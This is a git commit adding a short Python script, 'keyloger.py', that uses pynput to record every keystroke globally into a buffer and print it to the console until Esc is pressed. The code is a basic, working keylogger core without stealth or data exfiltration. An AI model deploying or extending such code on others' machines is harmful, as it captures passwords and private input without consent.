53c9d8ff0c025f2dec89f155233427c5d62fc01d
MATIN.H <119760438+MtProgrammer1386@users.noreply.github.com>
2023-01-26 11:07:43 +0300

    Add files via upload

---
+++ keyloger.py
@@ -0,0 +1,30 @@
+from pynput import keyboard
+
+
+text = ""
+
+def tusa_basinca(key):
+    global text
+    if key == keyboard.Key.enter:
+        text += "\n"
+    elif key == keyboard.Key.tab:
+        text += "\t"
+    elif key == keyboard.Key.space:
+        text += " "
+    elif key == keyboard.Key.shift:
+        pass
+    elif key == keyboard.Key.backspace and len(text) == 0:
+        pass
+    elif key == keyboard.Key.backspace and len(text) > 0:
+        text = text[:-1]
+    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+        pass
+    elif key == keyboard.Key.esc:
+        return False
+    else:
+        text += str(key).strip("")
+    print(text)
+
+with keyboard.Listener(
+    on_press=tusa_basinca) as listener:
+    listener.join()
